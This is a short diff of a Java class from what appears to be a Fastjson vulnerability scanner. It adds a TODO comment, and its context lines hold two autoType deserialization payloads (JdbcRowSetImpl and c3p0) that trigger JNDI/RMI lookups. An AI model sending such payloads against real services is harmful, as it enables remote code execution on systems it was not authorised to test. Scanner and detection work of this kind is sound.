@@ -7,6 +7,7 @@ public class Payload {
     //定义保存payload
 
     public static List<Vulnerability> getPayload() {
+        //todo payload拆分 拆分出部分常用的payload
         List<Vulnerability> vulnerabilities = new ArrayList<>();
         vulnerabilities.add(new Vulnerability("Check 1222-1224 Jdbc", "JdbcRowSetImpl", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/badClassName\", \"autoCommit\":true}"));
         vulnerabilities.add(new Vulnerability("Check 1222-1224 c3p0", "c3p0#JndiRefForwardingDataSource", "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\"jndiName\":\"rmi://127.0.0.1:1099/badClassName\", \"loginTimeout\":0}"));
